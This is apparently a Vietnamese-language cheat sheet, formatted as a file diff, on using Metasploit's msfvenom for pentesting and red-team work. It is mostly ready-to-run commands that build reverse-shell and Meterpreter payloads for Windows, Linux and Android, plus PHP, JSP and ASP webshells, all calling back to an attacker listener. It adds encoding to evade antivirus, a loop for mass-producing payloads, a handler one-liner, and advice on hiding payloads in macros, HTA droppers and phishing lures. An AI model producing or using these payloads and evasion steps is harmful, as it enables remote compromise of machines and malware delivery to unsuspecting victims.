@@ -1,0 +1,150 @@
+1. msfvenom là gì?
+
+    msfvenom là tool CLI nằm trong Metasploit Framework, dùng để tạo payload (shell, meterpreter, reverse shell, bind shell…), encode, packer, tạo file độc lập để exploit.
+
+    Hỗ trợ xuất ra exe, elf, apk, dll, asp, aspx, php, js, war, jar, powershell, bash, shellcode raw, v.v.
+
+    Kết hợp với msfconsole để tự động nhận kết nối về, post-exploit, persistence.
+
+2. Cú pháp msfvenom cơ bản
+
+msfvenom -p <payload> [options] -f <format> -o <output>
+
+    -p: Chọn payload (list bằng msfvenom -l payloads)
+
+    LHOST: IP máy nhận kết nối reverse
+
+    LPORT: Port listener
+
+    -f: Định dạng file (exe, elf, asp, php, raw, dll, js, war, jar, msi, c, ps1...)
+
+    -o: Tên file xuất ra (output)
+
+3. Ví dụ thực chiến cơ bản
+A. Tạo reverse shell Meterpreter cho Windows (.exe)
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.99 LPORT=4444 -f exe -o shell.exe
+
+B. Tạo shell cho Linux (.elf)
+
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.99 LPORT=4444 -f elf -o shell.elf
+
+C. Tạo shellcode raw (inject vào exploit, loader)
+
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.99 LPORT=4444 -f c
+# Xuất ra shellcode kiểu mảng C
+
+D. Tạo payload cho Android (.apk)
+
+msfvenom -p android/meterpreter/reverse_tcp LHOST=10.10.14.99 LPORT=4444 -o shell.apk
+
+E. Tạo webshell (.php, .asp, .jsp)
+
+msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.99 LPORT=4444 -f raw -o shell.php
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.99 LPORT=4444 -f raw -o shell.jsp
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.99 LPORT=4444 -f asp -o shell.asp
+
+F. Powershell/HTA/JS loader
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.99 LPORT=4444 -f psh-cmd
+
+    Dán output vào macro, LNK, HTA dropper, social engineering...
+
+4. Encode, obfuscate, bypass AV với msfvenom
+A. Encode shellcode
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.99 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 5 -o evilshell.exe
+
+    -e: Chọn encoder (list bằng msfvenom -l encoders)
+
+    -i: Số vòng encode (iteration) — càng nhiều càng khó detect (tối đa tầm 20)
+
+B. Encode chuỗi nhị phân (binary)
+
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.99 LPORT=4444 -f elf -e x86/call4_dword_xor -i 10 -o shell-enc.elf
+
+C. Obfuscate powershell, macro, loader
+
+    Export powershell script (-f psh), chèn vào macro, loader ngoài, encode base64, dùng tool macro obfuscator.
+
+    Kết hợp với Veil-Evasion, Donut, Shellter, Nim loader, macro4shell, htaify, v.v. để bypass AV mạnh hơn.
+
+5. Payload nâng cao & đa nền tảng
+A. Multi-handler, multi-arch
+
+    Payload hybrid, chạy cả trên x86/x64, hoặc tạo cùng lúc nhiều payload, đa nền tảng (Java, jar, war...).
+
+B. Custom payload, custom shellcode
+
+    Kết hợp với C/C++, loader tự code, nhúng shellcode msfvenom vào mã exploit khác.
+
+C. Tạo loader HTA, VBA, JS
+
+    Kết hợp với macro, phishing, LNK, shortcut attack, fake update để social engineering.
+
+D. Chèn shellcode vào file PE/ELF/office/RTF
+
+    Dùng msfvenom xuất shellcode raw rồi patch vào PE/ELF, hoặc dùng tool ngoài (Donut, macro4shell...).
+
+6. Chuyển đổi/convert định dạng output msfvenom
+Format	Ý nghĩa/ứng dụng
+exe	Windows binary
+elf	Linux binary
+dll	Windows DLL
+asp, aspx, php, jsp	Webshell
+war, jar	Java app container
+psh, psh-cmd	Powershell (embed vào macro, LNK)
+c, python, ruby	Mã shellcode cho dev
+bash, perl	Shell reverse qua bash/perl
+raw	Shellcode nhúng trực tiếp (inject/process hollowing)
+7. Automation & script hóa msfvenom
+
+    Tạo batch payload cho nhiều IP, port, output khác nhau:
+
+for ip in $(cat ips.txt); do msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=4444 -f exe -o $ip.exe; done
+
+Script auto combine msfvenom với msfconsole multi/handler:
+
+    msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 10.10.14.99; set LPORT 4444; run"
+
+    Dùng resource script .rc để tự động handler nhiều payload.
+
+8. Fix lỗi thực tế
+Lỗi	Fix
+Không chạy được file payload	AV block, phải encode hoặc bypass thêm (Veil, Shellter, macro, custom loader)
+Reverse shell không connect	LHOST, LPORT, NAT, port block, firewall
+Không chạy được trên Win x64	Dùng payload /x64/, đúng arch, đúng quyền
+Payload quá to	Chuyển sang stageless, encode ít vòng, dùng loader nhỏ
+Webshell không exec	Web server không hỗ trợ, thử đổi PHP, ASP, JSP, check quyền, debug path
+Payload bị lỗi khi tải lên	Đổi tên file, đổi extension, zip lại
+9. So sánh msfvenom với các công cụ khác
+Tool	Ưu điểm msfvenom	Khác biệt
+msfvenom	Payload đa dạng, encode, automation, multi-platform, mạnh nhất cho pentest	Payload phổ biến, dễ bị detect AV
+Veil	Payload bypass AV chuyên sâu, encode, loader mạnh	Không đa nền tảng bằng msfvenom
+Donut	Tạo shellcode .NET, loader mạnh cho process injection	Không tạo exe/elf sẵn, phải inject bằng loader
+Shellter	Patch file PE, loader AV evasion cho Windows	Không support Linux, phải có file exe gốc
+Nim/Go loader	Viết loader tùy biến, khó bị detect	Phải biết code, không auto nhiều loại như msfvenom
+10. Tài liệu, link hữu ích
+
+    Metasploit Payloads List
+
+    Metasploit Unleashed – msfvenom
+
+    Veil Framework
+
+    Donut Tool
+
+    PayloadAllTheThings – Reverse Shells
+
+    Hacktricks – msfvenom
+
+    Shellter
+
+Tóm tắt nhanh
+
+    msfvenom: tool tạo payload, shellcode, reverse shell, meterpreter mạnh nhất cho pentest/red team – đa nền tảng, encode, obfuscate, hỗ trợ mọi định dạng, automation tốt, script hóa được.
+
+    Kết hợp encode nhiều vòng, phối hợp với Veil, Shellter, macro4shell, Donut, Nim loader để bypass AV/EDR.
+
+    Tự động hóa chain với msfconsole, multi/handler, resource script để nhận nhiều session cùng lúc, post-exploit hiệu quả.
+
